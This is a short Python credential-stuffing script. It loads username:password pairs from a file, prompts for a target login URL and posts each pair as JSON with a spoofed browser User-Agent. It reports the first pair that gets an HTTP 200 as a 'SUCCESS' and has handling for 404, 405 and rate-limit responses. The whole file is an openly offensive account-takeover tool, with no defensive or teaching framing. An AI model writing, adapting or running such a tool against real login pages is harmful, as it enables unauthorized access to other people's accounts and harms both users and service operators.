#!/usr/bin/env python3

import requests
import time
import sys
import os

HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/143.0.0.0",
}

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <credentials_file>")
        sys.exit(1)

    creds_file = sys.argv[1]
    if not os.path.isfile(creds_file):
        print(f"[!] File not found: {creds_file}")
        sys.exit(1)

    url = input("[?] Enter target login URL: ").strip()
    
    try:
        with open(creds_file, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if ":" in line]
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        sys.exit(1)

    print(f"[*] Loaded {len(lines)} entries. Validating target...")
    session = requests.Session()

    for i, line in enumerate(lines):
        username, password = line.split(":", 1)
        payload = {"username": username, "password": password}

        try:
            response = session.post(url, json=payload, headers=HEADERS, timeout=10)

            # --- STRICT ERROR HANDLING ---
            
            # If the URL is wrong (e.g., 404) or Method Not Allowed (405)
            if response.status_code == 404:
                print(f"\n[!] STOPPING: The URL path was not found (404). Check your endpoint.")
                sys.exit(1)
            
            if response.status_code == 405:
                print(f"\n[!] STOPPING: Method Not Allowed (405). The target doesn't accept POST requests.")
                sys.exit(1)

            if response.status_code == 429:
                print(f"\n[!] STOPPING: Rate limited (429).")
                sys.exit(1)

            # If we get a 200 OK, it's a valid "logging point"
            if response.status_code == 200:
                # Check if the response actually indicates a successful login
                # (Some APIs return 200 even for failed logins, just with a 'success: false' body)
                print(f"\n[+] SUCCESS: {username}:{password}")
                return 

            # If it's the very first attempt and it's not a 200 or 401/403, the URL is likely wrong
            if i == 0 and response.status_code not in [200, 401, 403]:
                print(f"\n[!] STOPPING: Unexpected status code {response.status_code} on first attempt.")
                print("[*] Make sure the URL is a valid API login endpoint.")
                sys.exit(1)

            print(f"[-] Invalid: {username}", end="\r")
            time.sleep(0.2)

        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            print("\n[!] CRITICAL ERROR: Connection failed. Stopping script.")
            sys.exit(1)
        except KeyboardInterrupt:
            print("\n[!] User interrupted. Exiting...")
            sys.exit(0)
        except Exception as e:
            print(f"\n[!] Error: {e}")
            sys.exit(1)

    print("\n\n[-] Finished: No valid credentials found.")

if __name__ == "__main__":
    main()
